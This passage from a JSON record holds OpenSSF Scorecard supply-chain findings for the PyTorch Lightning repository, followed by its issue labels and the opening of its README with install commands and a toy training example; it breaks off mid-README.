                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/docker-build.yml:113: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/docker-build.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/docker-build.yml:118: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/docker-build.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/docker-build.yml:128: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/docker-build.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/docker-build.yml:146: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/docker-build.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/docker-build.yml:150: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/docker-build.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/docs-build.yml:66: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/docs-build.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/docs-build.yml:72: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/docs-build.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/docs-build.yml:91: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/docs-build.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/docs-build.yml:132: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/docs-build.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/docs-build.yml:161: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/docs-build.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/docs-build.yml:167: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/docs-build.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/docs-build.yml:172: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/docs-build.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/docs-tutorials.yml:21: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/docs-tutorials.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/docs-tutorials.yml:51: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/docs-tutorials.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/labeler-issue.yml:22: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/labeler-issue.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/labeler-issue.yml:25: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/labeler-issue.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/labeler-issue.yml:31: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/labeler-issue.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/labeler-pr.yml:11: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/labeler-pr.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/probot-auto-cc.yml:18: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/probot-auto-cc.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/probot-check-group.yml:17: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/probot-check-group.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-nightly.yml:26: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/release-nightly.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-nightly.yml:27: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/release-nightly.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-nightly.yml:43: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/release-nightly.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-nightly.yml:56: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/release-nightly.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-nightly.yml:57: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/release-nightly.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-pkg.yml:40: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/release-pkg.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-pkg.yml:41: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/release-pkg.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/release-pkg.yml:47: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/release-pkg.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-pkg.yml:57: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/release-pkg.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-pkg.yml:58: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/release-pkg.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-pkg.yml:77: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/release-pkg.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/release-pkg.yml:107: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/release-pkg.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-pkg.yml:142: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/release-pkg.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-pkg.yml:143: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/release-pkg.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-pkg.yml:167: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/release-pkg.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-pkg.yml:168: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/release-pkg.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/tpu-tests.yml:46: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/tpu-tests.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/tpu-tests.yml:49: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/tpu-tests.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/tpu-tests.yml:53: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/tpu-tests.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/tpu-tests.yml:56: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/tpu-tests.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/tpu-tests.yml:168: update your workflow using https://app.stepsecurity.io/secureworkflow/Lightning-AI/pytorch-lightning/tpu-tests.yml/master?enable=pin",
                        "Warn: containerImage not pinned by hash: dockers/base-cuda/Dockerfile:19",
                        "Warn: containerImage not pinned by hash: dockers/docs/Dockerfile:15: pin your Docker image by updating ubuntu:20.04 to ubuntu:20.04@sha256:8e5c4f0285ecbb4ead070431d29b576a530d3166df73ec44affc1cd27555141b",
                        "Warn: containerImage not pinned by hash: dockers/nvidia/Dockerfile:18",
                        "Warn: containerImage not pinned by hash: dockers/release/Dockerfile:19",
                        "Warn: pipCommand not pinned by hash: dockers/base-cuda/Dockerfile:78-96",
                        "Warn: pipCommand not pinned by hash: dockers/base-cuda/Dockerfile:78-96",
                        "Warn: downloadThenRun not pinned by hash: dockers/docs/Dockerfile:60-67",
                        "Warn: pipCommand not pinned by hash: dockers/docs/Dockerfile:60-67",
                        "Warn: pipCommand not pinned by hash: dockers/docs/Dockerfile:60-67",
                        "Warn: pipCommand not pinned by hash: dockers/nvidia/Dockerfile:28-50",
                        "Warn: pipCommand not pinned by hash: dockers/nvidia/Dockerfile:28-50",
                        "Warn: pipCommand not pinned by hash: dockers/nvidia/Dockerfile:52",
                        "Warn: pipCommand not pinned by hash: dockers/release/Dockerfile:28-46",
                        "Warn: pipCommand not pinned by hash: dockers/release/Dockerfile:28-46",
                        "Warn: pipCommand not pinned by hash: dockers/release/Dockerfile:28-46",
                        "Warn: pipCommand not pinned by hash: docs/generate_docs_for_tags.sh:23",
                        "Warn: pipCommand not pinned by hash: docs/generate_docs_for_tags.sh:24",
                        "Warn: pipCommand not pinned by hash: tests/legacy/generate_checkpoints.sh:39",
                        "Warn: pipCommand not pinned by hash: tests/legacy/generate_checkpoints.sh:55",
                        "Warn: pipCommand not pinned by hash: tests/tests_fabric/run_tpu_tests.sh:8",
                        "Warn: pipCommand not pinned by hash: tests/tests_fabric/run_tpu_tests.sh:10",
                        "Warn: pipCommand not pinned by hash: tests/tests_fabric/run_tpu_tests.sh:15",
                        "Warn: pipCommand not pinned by hash: tests/tests_pytorch/run_tpu_tests.sh:8",
                        "Warn: pipCommand not pinned by hash: tests/tests_pytorch/run_tpu_tests.sh:10",
                        "Warn: pipCommand not pinned by hash: tests/tests_pytorch/run_tpu_tests.sh:15",
                        "Warn: pipCommand not pinned by hash: .github/workflows/_legacy-checkpoints.yml:71",
                        "Warn: pipCommand not pinned by hash: .github/workflows/_legacy-checkpoints.yml:76",
                        "Warn: pipCommand not pinned by hash: .github/workflows/_legacy-checkpoints.yml:81",
                        "Warn: pipCommand not pinned by hash: .github/workflows/_legacy-checkpoints.yml:115",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci-pkg-install.yml:71",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci-pkg-install.yml:98",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci-tests-fabric.yml:98",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci-tests-fabric.yml:106",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci-tests-fabric.yml:135",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci-tests-pytorch.yml:103",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci-tests-pytorch.yml:111",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci-tests-pytorch.yml:141",
                        "Warn: pipCommand not pinned by hash: .github/workflows/code-checks.yml:47",
                        "Warn: pipCommand not pinned by hash: .github/workflows/docs-build.yml:80",
                        "Warn: pipCommand not pinned by hash: .github/workflows/docs-build.yml:86",
                        "Warn: pipCommand not pinned by hash: .github/workflows/docs-build.yml:88",
                        "Warn: pipCommand not pinned by hash: .github/workflows/docs-build.yml:107",
                        "Warn: pipCommand not pinned by hash: .github/workflows/docs-build.yml:114",
                        "Warn: pipCommand not pinned by hash: .github/workflows/release-nightly.yml:33",
                        "Warn: pipCommand not pinned by hash: .github/workflows/release-pkg.yml:63",
                        "Info:   0 out of  51 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   0 out of  24 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of   4 containerImage dependencies pinned",
                        "Info:   0 out of  40 pipCommand dependencies pinned",
                        "Info:   0 out of   1 downloadThenRun dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Warn: 0 commits out of 28 are checked with a SAST tool"
                    ],
                    "score": 0,
                    "reason": "SAST tool is not run on all commits -- score normalized to 0",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: SECURITY.md:1",
                        "Info: Found linked content: SECURITY.md:1",
                        "Warn: One or no descriptive hints of disclosure, vulnerability, and/or timelines in security policy",
                        "Warn: No text (besides links / emails) found in security policy"
                    ],
                    "score": 6,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": [
                        "Warn: release artifact 2.4.0 not signed: https://api.github.com/repos/Lightning-AI/pytorch-lightning/releases/168619294",
                        "Warn: release artifact 2.3.3 not signed: https://api.github.com/repos/Lightning-AI/pytorch-lightning/releases/164485200",
                        "Warn: release artifact 2.3.2 not signed: https://api.github.com/repos/Lightning-AI/pytorch-lightning/releases/163967616",
                        "Warn: release artifact 2.3.1 not signed: https://api.github.com/repos/Lightning-AI/pytorch-lightning/releases/162836049",
                        "Warn: release artifact 2.3.0 not signed: https://api.github.com/repos/Lightning-AI/pytorch-lightning/releases/159933699",
                        "Warn: release artifact 2.4.0 does not have provenance: https://api.github.com/repos/Lightning-AI/pytorch-lightning/releases/168619294",
                        "Warn: release artifact 2.3.3 does not have provenance: https://api.github.com/repos/Lightning-AI/pytorch-lightning/releases/164485200",
                        "Warn: release artifact 2.3.2 does not have provenance: https://api.github.com/repos/Lightning-AI/pytorch-lightning/releases/163967616",
                        "Warn: release artifact 2.3.1 does not have provenance: https://api.github.com/repos/Lightning-AI/pytorch-lightning/releases/162836049",
                        "Warn: release artifact 2.3.0 does not have provenance: https://api.github.com/repos/Lightning-AI/pytorch-lightning/releases/159933699"
                    ],
                    "score": 0,
                    "reason": "Project has not signed or included provenance with any releases.",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Info: jobLevel 'actions' permission set to 'read': .github/workflows/labeler-issue.yml:18",
                        "Info: jobLevel 'contents' permission set to 'read': .github/workflows/labeler-issue.yml:19",
                        "Info: jobLevel 'contents' permission set to 'read': .github/workflows/labeler-pr.yml:7",
                        "Warn: no topLevel permission defined: .github/workflows/_build-packages.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/_legacy-checkpoints.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/call-clear-cache.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/ci-check-md-links.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/ci-checkpoints.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/ci-pkg-install.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/ci-schema.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/ci-tests-fabric.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/ci-tests-pytorch.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/cleanup-caches.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/code-checks.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/docker-build.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/docs-build.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/docs-tutorials.yml:1",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/labeler-issue.yml:7",
                        "Warn: no topLevel permission defined: .github/workflows/labeler-pr.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/probot-auto-cc.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/probot-check-group.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/release-nightly.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/release-pkg.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/tpu-tests.yml:1",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": [
                        "Warn: Project is vulnerable to: GHSA-cgwc-qvrx-rf7f",
                        "Warn: Project is vulnerable to: GHSA-mr7h-w2qc-ffc2"
                    ],
                    "score": 8,
                    "reason": "2 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/pytorchlightning/pytorch-lightning/contents/SECURITY.md",
        "SecurityPolicy_content": "developer@lightning.ai\n",
        "project_all_labels": [
            "3rd party",
            "accelerator",
            "accelerator: cpu",
            "accelerator: cuda",
            "accelerator: hpu (external)",
            "accelerator: ipu (removed)",
            "accelerator: mps",
            "accelerator: tpu",
            "admin",
            "app (removed)",
            "argparse (removed)",
            "breaking change",
            "bug",
            "callback",
            "callback: device stats",
            "callback: early stopping",
            "callback: finetuning",
            "callback: gradient accumulation",
            "callback: lambda function",
            "callback: lr monitor",
            "callback: model checkpoint",
            "callback: model summary",
            "callback: prediction writer",
            "callback: pruning",
            "callback: quantization (removed)",
            "callback: swa",
            "callback: throughput",
            "callback: timer",
            "checkpointing",
            "ci",
            "code quality",
            "community",
            "data (external)",
            "data handling",
            "dependencies",
            "deprecation",
            "design",
            "discussion",
            "distributed",
            "dockers",
            "docs",
            "duplicate",
            "environment",
            "environment: kubeflow",
            "environment: lightning",
            "environment: lsf",
            "environment: mpi",
            "environment: slurm",
            "environment: torchelastic",
            "example",
            "examples",
            "experimental",
            "fabric",
            "fault tolerance",
            "feature",
            "fun",
            "github_actions",
            "good first issue",
            "has conflicts",
            "help wanted",
            "hooks",
            "io",
            "let's do it!",
            "lightningcli",
            "lightningdatamodule",
            "lightningmodule",
            "logger",
            "logger: comet",
            "logger: csv",
            "logger: mlflow",
            "logger: neptune",
            "logger: tensorboard",
            "logger: testtube (removed)",
            "logger: wandb",
            "logging",
            "loops",
            "lr scheduler",
            "needs triage",
            "optimization",
            "optimizer",
            "package",
            "performance",
            "pl",
            "plugin",
            "precision: amp",
            "precision: apex (removed)",
            "precision: bnb",
            "precision: double",
            "precision: half",
            "precision: te",
            "priority: 0",
            "priority: 1",
            "priority: 2",
            "profiler",
            "progress bar: rich",
            "progress bar: tqdm",
            "progress tracking (internal)",
            "question",
            "ready",
            "refactor",
            "release",
            "repro needed",
            "reproducibility",
            "run TPU",
            "store",
            "strategy",
            "strategy: bagua (removed)",
            "strategy: colossalai (removed)",
            "strategy: ddp",
            "strategy: deepspeed",
            "strategy: dp (removed in pl)",
            "strategy: fairscale fsdp (removed)",
            "strategy: fairscale sharded (removed)",
            "strategy: fsdp",
            "strategy: hivemind (external)",
            "strategy: horovod (removed)",
            "strategy: hpu (external)",
            "strategy: ipu (removed)",
            "strategy: xla",
            "tests",
            "torch.compile",
            "trainer",
            "trainer: argument",
            "trainer: connector",
            "trainer: fit",
            "trainer: predict",
            "trainer: test",
            "trainer: validate",
            "tuner",
            "ver: 1.6.x",
            "ver: 1.7.x",
            "ver: 1.8.x",
            "ver: 1.9.x",
            "ver: 2.0.x",
            "ver: 2.1.x",
            "ver: 2.2.x",
            "ver: 2.3.x",
            "ver: 2.4.x",
            "waiting on author",
            "won't fix",
            "working as intended"
        ],
        "README_content": "<div align=\"center\">\n\n<img alt=\"Lightning\" src=\"https://pl-bolts-doc-images.s3.us-east-2.amazonaws.com/app-2/ptl_banner.png\" width=\"800px\" style=\"max-width: 100%;\">\n\n<br/>\n<br/>\n\n**The deep learning framework to pretrain, finetune and deploy AI models.**\n\n**NEW- Deploying models? Check out [LitServe](https://github.com/Lightning-AI/litserve), the PyTorch Lightning for model serving**\n\n______________________________________________________________________\n\n<p align=\"center\">\n    <a href=\"#quick-start\" style=\"margin: 0 10px;\">Quick start</a> •\n  <a href=\"#examples\">Examples</a> •\n  <a href=\"#why-pytorch-lightning\">PyTorch Lightning</a> •\n  <a href=\"#lightning-fabric-expert-control\">Fabric</a> •\n  <a href=\"https://lightning.ai/\">Lightning AI</a> •   \n  <a href=\"#community\">Community</a> •\n  <a href=\"https://pytorch-lightning.readthedocs.io/en/stable/\">Docs</a>\n</p>\n\n<!-- DO NOT ADD CONDA DOWNLOADS... README CHANGES MUST BE APPROVED BY EDEN OR WILL -->\n\n[![PyPI - Python Version](https://img.shields.io/pypi/pyversions/pytorch-lightning)](https://pypi.org/project/pytorch-lightning/)\n[![PyPI Status](https://badge.fury.io/py/pytorch-lightning.svg)](https://badge.fury.io/py/pytorch-lightning)\n[![PyPI - Downloads](https://img.shields.io/pypi/dm/pytorch-lightning)](https://pepy.tech/project/pytorch-lightning)\n[![Conda](https://img.shields.io/conda/v/conda-forge/lightning?label=conda&color=success)](https://anaconda.org/conda-forge/lightning)\n[![codecov](https://codecov.io/gh/Lightning-AI/pytorch-lightning/graph/badge.svg?token=SmzX8mnKlA)](https://codecov.io/gh/Lightning-AI/pytorch-lightning)\n\n[![Discord](https://img.shields.io/discord/1077906959069626439?style=plastic)](https://discord.gg/VptPCZkGNa)\n![GitHub commit activity](https://img.shields.io/github/commit-activity/w/lightning-ai/lightning)\n[![license](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](https://github.com/Lightning-AI/lightning/blob/master/LICENSE)\n\n<!--\n[![CodeFactor](https://www.codefactor.io/repository/github/Lightning-AI/lightning/badge)](https://www.codefactor.io/repository/github/Lightning-AI/lightning)\n-->\n\n</div>\n\n<div align=\"center\">\n  \n<p align=\"center\">\n\n&nbsp;\n  \n<a target=\"_blank\" href=\"https://lightning.ai/docs/pytorch/latest/starter/introduction.html#define-a-lightningmodule\">\n  <img src=\"https://pl-bolts-doc-images.s3.us-east-2.amazonaws.com/app-2/get-started-badge.svg\" height=\"36px\" alt=\"Get started\"/>\n</a>\n\n</p>\n\n</div>\n\n&nbsp;\n\n# Lightning has 2 core packages\n\n[PyTorch Lightning: Train and deploy PyTorch at scale](#why-pytorch-lightning).\n<br/>\n[Lightning Fabric: Expert control](#lightning-fabric-expert-control).\n\nLightning gives you granular control over how much abstraction you want to add over PyTorch.\n\n<div align=\"center\">\n    <img src=\"https://pl-public-data.s3.amazonaws.com/assets_lightning/continuum.png\" width=\"80%\">\n</div>\n\n&nbsp;\n\n# Quick start\nInstall Lightning:\n\n```bash\npip install lightning\n```\n\n<!-- following section will be skipped from PyPI description -->\n\n<details>\n  <summary>Advanced install options</summary>\n    <!-- following section will be skipped from PyPI description -->\n\n#### Install with optional dependencies\n\n```bash\npip install lightning['extra']\n```\n\n#### Conda\n\n```bash\nconda install lightning -c conda-forge\n```\n\n#### Install stable version\n\nInstall future release from the source\n\n```bash\npip install https://github.com/Lightning-AI/lightning/archive/refs/heads/release/stable.zip -U\n```\n\n#### Install bleeding-edge\n\nInstall nightly from the source (no guarantees)\n\n```bash\npip install https://github.com/Lightning-AI/lightning/archive/refs/heads/master.zip -U\n```\n\nor from testing PyPI\n\n```bash\npip install -iU https://test.pypi.org/simple/ pytorch-lightning\n```\n\n</details>\n<!-- end skipping PyPI description -->\n\n### PyTorch Lightning example\nDefine the training workflow. Here's a toy example ([explore real examples](https://lightning.ai/lightning-ai/studios?view=public&section=featured&query=pytorch+lightning)):\n\n```python\n# main.py\n# ! pip install torchvision\nimport torch, torch.nn as nn, torch.utils.data as data, torchvision as tv, torch.nn.functional as F\nimport lightning as L\n\n# --------------------------------\n# Step 1: Define a LightningModule\n# --------------------------------\n# A LightningModule (nn.Module subclass) defines a full *system*\n# (ie: an LLM, diffusion model, autoencoder, or simple image classifier).\n\n\nclass LitAutoEncoder(L.LightningModule):\n    def __init__(self):\n        super().__init__()\n        self.encoder = nn.Sequential(nn.Linear(28 * 28, 128), nn.ReLU(), nn.Linear(128, 3))\n        self.decoder = nn.Sequential(nn.Linear(3, 128), nn.ReLU(), nn.Linear(128, 28 * 28))\n\n    def forward(self, x):\n        # in lightning, forward defines the prediction/inference actions\n        embedding = self.encoder(x)\n        return embedding\n\n    def training_step(self, batch, batch_idx):\n        # training_step defines the train loop. It is independent of forward\n        x, _ = batch\n        x = x.view(x.size(0), -1)\n        z = self.encoder(x)\n        x_hat = self.decoder(z)\n        loss = F.mse_loss(x_hat, x)\n        self.log(\"train_loss\", loss)\n        return loss\n\n    def configure_optimizers(self):\n        optimizer = torch.optim.Adam(self.parameters(), lr=1e-3)\n        return optimizer\n\n\n# -------------------\n# Step 2: Define data\n# -------------------\ndataset = tv.datasets.MNIST(\".\", download=True, transform=tv.transforms.ToTensor())\ntrain, val = data.random_split(dataset, [55000, 5000])\n\n# -------------------\n# Step 3: Train\n# -------------------\nautoencoder = LitAutoEncoder()\ntrainer = L.Trainer()\ntrainer.fit(autoencoder, data.DataLoader(train), data.DataLoader(val))\n```\n\nRun the model on your terminal\n\n```bash\npip install torchvision\npython main.py\n```\n\n&nbsp;\n\n\n# Why PyTorch Lightning?\n\nPyTorch Lightning is just organized PyTorch - Lightning disentangles PyTorch code to decouple the science from the engineering.\n\n![PT to PL](docs/source-pytorch/_static/images/general/pl_quick_start_full_compressed.gif)\n\n&nbsp;\n\n----\n\n### Examples\nExplore various types of training possible with PyTorch Lightning. Pretrain and finetune ANY kind of model to perform ANY task like classification, segmentation, summarization and more:    \n\n| Task                                                                                                        | Description                                                    | Run |\n|-------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------|---|\n| [Hello world](#hello-simple-model)                                                                          | Pretrain - Hello world example                                 | <a target=\"_blank\" href=\"https://lightning.ai/lightning-ai/studios/pytorch-lightning-hello-world\"><img src=\"https://pl-bolts-doc-images.s3.us-east-2.amazonaws.com/app-2/studio-badge.svg\" alt=\"Open In Studio\"/></a> |\n| [Image classification](https://lightning.ai/lightning-ai/studios/image-classification-with-pytorch-lightning) | Finetune - ResNet-34 model to classify images of cars          | <a target=\"_blank\" href=\"https://lightning.ai/lightning-ai/studios/image-classification-with-pytorch-lightning\"><img src=\"https://pl-bolts-doc-images.s3.us-east-2.amazonaws.com/app-2/studio-badge.svg\" alt=\"Open In Studio\"/></a> |   \n| [Image segmentation](https://lightning.ai/lightning-ai/studios/image-segmentation-with-pytorch-lightning)   | Finetune - ResNet-50 model to segment images                   | <a target=\"_blank\" href=\"https://lightning.ai/lightning-ai/studios/image-segmentation-with-pytorch-lightning\"><img src=\"https://pl-bolts-doc-images.s3.us-east-2.amazonaws.com/app-2/studio-badge.svg\" alt=\"Open In Studio\"/></a> |   \n| [Object detection](https://lightning.ai/lightning-ai/studios/object-detection-with-pytorch-lightning)       | Finetune - Faster R-CNN model to detect objects                   | <a target=\"_blank\" href=\"https://lightning.ai/lightning-ai/studios/object-detection-with-pytorch-lightning\"><img src=\"https://pl-bolts-doc-images.s3.us-east-2.amazonaws.com/app-2/studio-badge.svg\" alt=\"Open In Studio\"/></a> |\n| [Text classification](https://lightning.ai/lightning-ai/studios/text-classification-with-pytorch-lightning) | Finetune - text classifier (BERT model)                        | <a target=\"_blank\" href=\"https://lightning.ai/lightning-ai/studios/text-classification-with-pytorch-lightning\"><img src=\"https://pl-bolts-doc-images.s3.us-east-2.amazonaws.com/app-2/studio-badge.svg\" alt=\"Open In Studio\"/></a> |   \n| [Text summarization](https://lightning.ai/lightning-ai/studios/text-summarization-with-pytorch-lightning)   | Finetune - text summarization (Hugging Face transformer model) | <a target=\"_blank\" href=\"https://lightning.ai/lightning-ai/studios/text-summarization-with-pytorch-lightning\"><img src=\"https://pl-bolts-doc-images.s3.us-east-2.amazonaws.com/app-2/studio-badge.svg\" alt=\"Open In Studio\"/></a> |   \n| [Audio generation](https://lightning.ai/lightning-ai/studios/finetune-a-personal-ai-music-generator)        | Finetune - audio generator (transformer model)                 | <a target=\"_blank\" href=\"https://lightning.ai/lightning-ai/studios/finetune-a-personal-ai-music-generator\"><img 